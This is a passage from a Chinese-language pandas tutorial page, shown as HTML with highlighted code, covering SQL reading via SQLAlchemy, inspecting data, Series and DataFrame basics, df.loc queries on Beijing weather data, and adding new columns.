class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table = pd.read_sql(<span class="string">&quot;select * from tbname&quot;</span>, con=conn)</span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">   id                       preorder_traversal_string</span></span><br><span class="line"><span class="string">0   1             4_2_1_0_#_#_#_3_#_#_8_7_#_#_11_#_#_</span></span><br><span class="line"><span class="string">1   2  5_4_2_#_#_1_7_#_6_#_#_#_3_0_#_5_1_#_#_#_6_#_#_</span></span><br><span class="line"><span class="string">2   3                  6_#_7_5_3_#_#_1_#_#_2_8_#_#_#_</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>但是会报警告：</p><blockquote><p> UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.</p></blockquote><p>这里建议我们使用SQLAlchemy</p><h3 id="3-2-使用SQLAlchemy"><a href="#3-2-使用SQLAlchemy" class="headerlink" title="3.2 使用SQLAlchemy"></a>3.2 使用SQLAlchemy</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">user = <span class="string">&quot;root&quot;</span></span><br><span class="line">password = <span class="string">&quot;password&quot;</span></span><br><span class="line">database = <span class="string">&quot;dbname&quot;</span></span><br><span class="line"></span><br><span class="line">engine = create_engine(<span class="string">f&quot;mysql+pymysql://<span class="subst">&#123;user&#125;</span>:<span class="subst">&#123;password&#125;</span>@<span class="subst">&#123;host&#125;</span>/<span class="subst">&#123;database&#125;</span>&quot;</span>)</span><br><span class="line">sql = <span class="string">&#x27;select * from tbname&#x27;</span></span><br><span class="line">table = pd.read_sql(sql=sql, con=engine)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">   id                       preorder_traversal_string</span></span><br><span class="line"><span class="string">0   1             4_2_1_0_#_#_#_3_#_#_8_7_#_#_11_#_#_</span></span><br><span class="line"><span class="string">1   2  5_4_2_#_#_1_7_#_6_#_#_#_3_0_#_5_1_#_#_#_6_#_#_</span></span><br><span class="line"><span class="string">2   3                  6_#_7_5_3_#_#_1_#_#_2_8_#_#_#_</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="4-查看数据格式"><a href="#4-查看数据格式" class="headerlink" title="4. 查看数据格式"></a>4. 查看数据格式</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看前几行数据，默认为5行</span></span><br><span class="line"><span class="built_in">print</span>(ratings.head())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">   userId  movieId  rating  timestamp</span></span><br><span class="line"><span class="string">0       1        1     4.0  964982703</span></span><br><span class="line"><span class="string">1       1        3     4.0  964981247</span></span><br><span class="line"><span class="string">2       1        6     4.0  964982224</span></span><br><span class="line"><span class="string">3       1       47     5.0  964983815</span></span><br><span class="line"><span class="string">4       1       50     5.0  964982931</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看数据的形状，返回(行数、列数)</span></span><br><span class="line"><span class="built_in">print</span>(ratings.shape)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">(100836, 4)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看列名列表</span></span><br><span class="line"><span class="built_in">print</span>(ratings.columns)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">Index([&#x27;userId&#x27;, &#x27;movieId&#x27;, &#x27;rating&#x27;, &#x27;timestamp&#x27;], dtype=&#x27;object&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看索引列</span></span><br><span class="line"><span class="built_in">print</span>(ratings.index)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">RangeIndex(start=0, stop=100836, step=1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看每列的数据类型</span></span><br><span class="line"><span class="built_in">print</span>(ratings.dtypes)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">userId         int64</span></span><br><span class="line"><span class="string">movieId        int64</span></span><br><span class="line"><span class="string">rating       float64</span></span><br><span class="line"><span class="string">timestamp      int64</span></span><br><span class="line"><span class="string">dtype: object</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="二、数据结构"><a href="#二、数据结构" class="headerlink" title="二、数据结构"></a>二、数据结构</h1><h2 id="1-Series"><a href="#1-Series" class="headerlink" title="1. Series"></a>1. Series</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Series</span></span><br><span class="line">s1 = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;abcd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0    a</span></span><br><span class="line"><span class="string">1    b</span></span><br><span class="line"><span class="string">2    c</span></span><br><span class="line"><span class="string">3    d</span></span><br><span class="line"><span class="string">dtype: object</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定索引创建Series</span></span><br><span class="line">s2 = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;efgh&#x27;</span>), index=<span class="built_in">list</span>(<span class="string">&#x27;abcd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"><span class="built_in">print</span>(s2.index)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a    e</span></span><br><span class="line"><span class="string">b    f</span></span><br><span class="line"><span class="string">c    g</span></span><br><span class="line"><span class="string">d    h</span></span><br><span class="line"><span class="string">dtype: object</span></span><br><span class="line"><span class="string">Index([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;], dtype=&#x27;object&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字典创建Series</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;h&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s3 = pd.Series(<span class="built_in">dict</span>)</span><br><span class="line"><span class="built_in">print</span>(s3)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a    e</span></span><br><span class="line"><span class="string">b    f</span></span><br><span class="line"><span class="string">c    g</span></span><br><span class="line"><span class="string">d    h</span></span><br><span class="line"><span class="string">dtype: object</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="2-DataFrame"><a href="#2-DataFrame" class="headerlink" title="2. DataFrame"></a>2. DataFrame</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典创建DataFrame</span></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: [<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Nevada&#x27;</span>, <span class="string">&#x27;Nevada&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;year&#x27;</span>: [<span class="number">2000</span>, <span class="number">2001</span>, <span class="number">2002</span>, <span class="number">2001</span>, <span class="number">2002</span>],</span><br><span class="line">        <span class="string">&#x27;pop&#x27;</span>: [<span class="number">1.5</span>, <span class="number">1.7</span>, <span class="number">3.6</span>, <span class="number">2.4</span>, <span class="number">2.9</span>]</span><br><span class="line">    &#125;</span><br><span class="line">df = pd.DataFrame(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    state  year  pop</span></span><br><span class="line"><span class="string">0    Ohio  2000  1.5</span></span><br><span class="line"><span class="string">1    Ohio  2001  1.7</span></span><br><span class="line"><span class="string">2    Ohio  2002  3.6</span></span><br><span class="line"><span class="string">3  Nevada  2001  2.4</span></span><br><span class="line"><span class="string">4  Nevada  2002  2.9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出DataFrame的索引、列标签以及数据类型</span></span><br><span class="line"><span class="built_in">print</span>(df.index, <span class="string">&#x27;\n\n&#x27;</span>, df.columns, <span class="string">&#x27;\n\n&#x27;</span>, df.dtypes)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">RangeIndex(start=0, stop=5, step=1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Index([&#x27;state&#x27;, &#x27;year&#x27;, &#x27;pop&#x27;], dtype=&#x27;object&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> state     object</span></span><br><span class="line"><span class="string">year       int64</span></span><br><span class="line"><span class="string">pop      float64</span></span><br><span class="line"><span class="string">dtype: object</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="三、查询数据"><a href="#三、查询数据" class="headerlink" title="三、查询数据"></a>三、查询数据</h1><h2 id="0-查询方法"><a href="#0-查询方法" class="headerlink" title="0. 查询方法"></a>0. 查询方法</h2><ol><li>df.loc ：基于标签索引，结果包含最后一个标签的值</li><li>df.iloc：基于位置索引，结果不包含最后一个位置的值</li><li>df.where</li><li>df.query</li></ol><p>本节主要介绍df.loc</p><h2 id="1-数据预处理"><a href="#1-数据预处理" class="headerlink" title="1. 数据预处理"></a>1. 数据预处理</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据预处理</span></span><br><span class="line">df = pd.read_csv(<span class="string">&quot;../datas/beijing_tianqi/beijing_tianqi_2018.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.head())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          ymd bWendu yWendu tianqi fengxiang fengli  aqi aqiInfo  aqiLevel</span></span><br><span class="line"><span class="string">0  2018-01-01     3℃    -6℃   晴~多云       东北风   1-2级   59       良         2</span></span><br><span class="line"><span class="string">1  2018-01-02     2℃    -5℃   阴~多云       东北风   1-2级   49       优         1</span></span><br><span class="line"><span class="string">2  2018-01-03     2℃    -5℃     多云        北风   1-2级   28       优         1</span></span><br><span class="line"><span class="string">3  2018-01-04     0℃    -8℃      阴       东北风   1-2级   28       优         1</span></span><br><span class="line"><span class="string">4  2018-01-05     3℃    -6℃   多云~晴       西北风   1-2级   50       优   </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设定索引为日期，方便按日期筛选</span></span><br><span class="line">df.set_index(<span class="string">&#x27;ymd&#x27;</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 替换掉温度的后缀℃</span></span><br><span class="line">df.loc[:, <span class="string">&quot;bWendu&quot;</span>] = df[<span class="string">&quot;bWendu&quot;</span>].<span class="built_in">str</span>.replace(<span class="string">&quot;℃&quot;</span>, <span class="string">&quot;&quot;</span>).astype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line">df.loc[:, <span class="string">&quot;yWendu&quot;</span>] = df[<span class="string">&quot;yWendu&quot;</span>].<span class="built_in">str</span>.replace(<span class="string">&quot;℃&quot;</span>, <span class="string">&quot;&quot;</span>).astype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line"><span class="comment"># df[df.columns[&quot;bWendu&quot;]] = df[&quot;bWendu&quot;].str.replace(&quot;℃&quot;, &quot;&quot;).astype(&#x27;int32&#x27;)</span></span><br><span class="line"><span class="comment"># df[df.columns[&quot;yWendu&quot;]] = df[&quot;yWendu&quot;].str.replace(&quot;℃&quot;, &quot;&quot;).astype(&#x27;int32&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df.head())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            bWendu  yWendu tianqi fengxiang fengli  aqi aqiInfo  aqiLevel</span></span><br><span class="line"><span class="string">ymd</span></span><br><span class="line"><span class="string">2018-01-01       3      -6   晴~多云       东北风   1-2级   59       良         2</span></span><br><span class="line"><span class="string">2018-01-02       2      -5   阴~多云       东北风   1-2级   49       优         1</span></span><br><span class="line"><span class="string">2018-01-03       2      -5     多云        北风   1-2级   28       优         1</span></span><br><span class="line"><span class="string">2018-01-04       0      -8      阴       东北风   1-2级   28       优         1</span></span><br><span class="line"><span class="string">2018-01-05       3      -6   多云~晴       西北风   1-2级   50       优    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里会报一个警告：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DeprecationWarning: <span class="title">In</span> <span class="title">a</span> <span class="title">future</span> <span class="title">version</span>, `<span class="title">df.iloc</span>[:, <span class="title">i</span>] = <span class="title">newvals</span>` <span class="title">will</span> <span class="title">attempt</span> <span class="title">to</span> <span class="title">set</span> <span class="title">the</span> </span></span><br><span class="line"><span class="function"><span class="title">values</span> <span class="title">inplace</span> <span class="title">instead</span> <span class="title">of</span> <span class="title">always</span> <span class="title">setting</span> <span class="title">a</span> <span class="title">new</span> <span class="title">array</span>. <span class="title">To</span> <span class="title">retain</span> <span class="title">the</span> <span class="title">old</span> <span class="title">behavior</span>, <span class="title">use</span> <span class="title">either</span></span></span><br><span class="line"><span class="function">`<span class="title">df</span>[<span class="title">df.columns</span>[<span class="title">i</span>]] = <span class="title">newvals</span>` <span class="title">or</span>, <span class="title">if</span> <span class="title">columns</span> <span class="title">are</span> <span class="title">non</span>-<span class="title">unique</span>, `<span class="title">df.isetitem</span>(<span class="title">i</span>, <span class="title">newvals</span>)`</span></span><br></pre></td></tr></table></figure></p><h2 id="2-按数值、列表、区间查询"><a href="#2-按数值、列表、区间查询" class="headerlink" title="2. 按数值、列表、区间查询"></a>2. 按数值、列表、区间查询</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到单个值</span></span><br><span class="line">single_value = df.loc[<span class="string">&#x27;2018-01-03&#x27;</span>, <span class="string">&#x27;bWendu&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到一列/一行</span></span><br><span class="line">s1 = df.loc[<span class="string">&#x27;2018-01-03&#x27;</span>, [<span class="string">&#x27;bWendu&#x27;</span>, <span class="string">&#x27;yWendu&#x27;</span>]]</span><br><span class="line">s2 = df.loc[[<span class="string">&#x27;2018-01-03&#x27;</span>, <span class="string">&#x27;2018-01-04&#x27;</span>, <span class="string">&#x27;2018-01-05&#x27;</span>], <span class="string">&#x27;bWendu&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到DataFrame</span></span><br><span class="line">df2 = df.loc[[<span class="string">&#x27;2018-01-03&#x27;</span>,<span class="string">&#x27;2018-01-04&#x27;</span>,<span class="string">&#x27;2018-01-05&#x27;</span>], [<span class="string">&#x27;bWendu&#x27;</span>, <span class="string">&#x27;yWendu&#x27;</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按区间查询</span></span><br><span class="line">df3 = df.loc[<span class="string">&#x27;2018-01-03&#x27;</span>:<span class="string">&#x27;2018-01-05&#x27;</span>, <span class="string">&#x27;bWendu&#x27;</span>:<span class="string">&#x27;fengxiang&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="3-条件查询"><a href="#3-条件查询" class="headerlink" title="3. 条件查询"></a>3. 条件查询</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询最高温度小于30度，并且最低温度大于15度，并且是晴天，并且天气为优的数据</span></span><br><span class="line">df4 = df.loc[(df[<span class="string">&quot;bWendu&quot;</span>] &lt;= <span class="number">30</span>) &amp; (df[<span class="string">&quot;yWendu&quot;</span>] &gt;= <span class="number">15</span>)</span><br><span class="line">        &amp; (df[<span class="string">&quot;tianqi&quot;</span>] == <span class="string">&#x27;晴&#x27;</span>) &amp; (df[<span class="string">&quot;aqiLevel&quot;</span>] == <span class="number">1</span>), :]</span><br><span class="line"><span class="built_in">print</span>(df4)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            bWendu  yWendu tianqi fengxiang fengli  aqi aqiInfo  aqiLevel</span></span><br><span class="line"><span class="string">ymd</span></span><br><span class="line"><span class="string">2018-08-24      30      20      晴        北风   1-2级   40       优         1</span></span><br><span class="line"><span class="string">2018-09-07      27      16      晴       西北风   3-4级   22       优         1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中，条件表达式返回的是一个布尔值的Series</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 观察条件表达式</span></span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&quot;yWendu&quot;</span>] &lt; -<span class="number">10</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2018-01-01    False</span></span><br><span class="line"><span class="string">2018-01-02    False</span></span><br><span class="line"><span class="string">2018-01-03    False</span></span><br><span class="line"><span class="string">2018-01-04    False</span></span><br><span class="line"><span class="string">2018-01-05    False</span></span><br><span class="line"><span class="string">              ...</span></span><br><span class="line"><span class="string">2018-12-27     True</span></span><br><span class="line"><span class="string">2018-12-28     True</span></span><br><span class="line"><span class="string">2018-12-29     True</span></span><br><span class="line"><span class="string">2018-12-30     True</span></span><br><span class="line"><span class="string">2018-12-31    False</span></span><br><span class="line"><span class="string">Name: yWendu, Length: 365, dtype: bool</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="4-函数查询"><a href="#4-函数查询" class="headerlink" title="4. 函数查询"></a>4. 函数查询</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接写lambda表达式</span></span><br><span class="line">df5 = df.loc[<span class="keyword">lambda</span> df : (df[<span class="string">&quot;bWendu&quot;</span>] &lt;= <span class="number">30</span>) &amp; (df[<span class="string">&quot;yWendu&quot;</span>] &gt;= <span class="number">15</span>), :]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写自己的函数，查询9月份，空气质量好的数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_my_data</span>(<span class="params">df</span>):</span><br><span class="line">    <span class="keyword">return</span> df.index.<span class="built_in">str</span>.startswith(<span class="string">&quot;2018-09&quot;</span>) &amp; (df[<span class="string">&quot;aqiLevel&quot;</span>] == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">df6 = df.loc[query_my_data, :]</span><br></pre></td></tr></table></figure><h1 id="四、新增数据列"><a href="#四、新增数据列" class="headerlink" title="四、新增数据列"></a>四、新增数据列</h1><h2 id="1-直接赋值"><a href="#1-直接赋值" class="headerlink" title="1. 直接赋值"></a>1. 直接赋值</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.loc[:, <span class="string">&#x27;wencha&#x27;</span>] = df[<span class="string">&#x27;bWendu&#x27;</span>] - df[<span class="string">&#x27;yWendu&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="2-df-apply"><a href="#2-df-apply" class="headerlink" title="2. df.apply"></a>2. df.apply</h2><p>传入一个函数并选定axis：</p><ol><li>当axis=1，函数的参数为一行的Series（常用）</li><li>当axis=0，函数的参数为一列的Series</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_wendu_type</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x[<span class="string">&quot;bWendu&quot;</span>] &gt; <span class="number">33</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;高温&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x[<span class="string">&quot;yWendu&quot;</span>] &lt; -<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;低温&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;常温&#x27;</span></span><br><span class="line"></span><br><span class="line">df.loc[:, <span class="string">&quot;wendu_type&quot;</span>] = df.apply(get_wendu_type, axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="3-df-assign"><a href="#3-df-assign" class="headerlink" title="3. df.assign"></a>3. df.assign</h2><p>df.assign总是会创建一个<strong>新的copy</strong></p><p>利用lambda表达式，处理原来的数据得到新列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 可以同时添加多个新的列</span><br><span class="line">df.assign(</span><br><span class="line">    yWendu_huashi = lambda x : x[&quot;yWendu&quot;] * 9 / 5 + 32,</span><br><span class="line">    # 摄氏度转华氏度</span><br><span class="line">    bWendu_huashi = lambda x : x[&quot;bWendu&quot;] * 9 / 5 + 32</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="4-Series-map"><a href="#4-Series-map" class="headerlink" title="4. Series.map"></a>4. Series.map</h2><p>传入一个字典，将Series的值根据字典映射</p><p>示例如下：</p><p>原始数据</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stocks = pd.read_excel(<span class="string">&#x27;../datas/stocks/互联网公司股票.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span 